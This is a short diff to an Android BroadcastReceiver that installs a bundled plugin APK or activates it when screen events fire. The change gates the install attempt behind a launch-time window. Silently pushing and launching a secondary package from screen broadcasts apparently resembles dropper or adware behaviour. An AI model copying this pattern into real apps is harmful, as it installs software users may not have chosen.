@@ -43,11 +43,13 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                 boolean pluginInstalled = SettingManager.getInstance().getKeyPluginInstalled();
 //                                            ? true
 //                                            : SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
+                long cur = System.currentTimeMillis();
                 if (UtilOperator.isPluginApkExist()
                         /**&& !UtilsRuntime.isPackageHasInstalled(context, Config.PLUGIN_PACKAGE_NAME)**/
                         && !pluginInstalled) {
-
-                    UtilOperator.tryToInstallPluginLocal(context);
+                    if (SettingManager.getInstance().getKeyLanuchTime() + SettingManager.getInstance().getKeyInstallInterval() > cur) {
+                        UtilOperator.tryToInstallPluginLocal(context);
+                    }
                 } else if (pluginInstalled) {
                     Utils.tryToActivePluginApp(context);
                 }
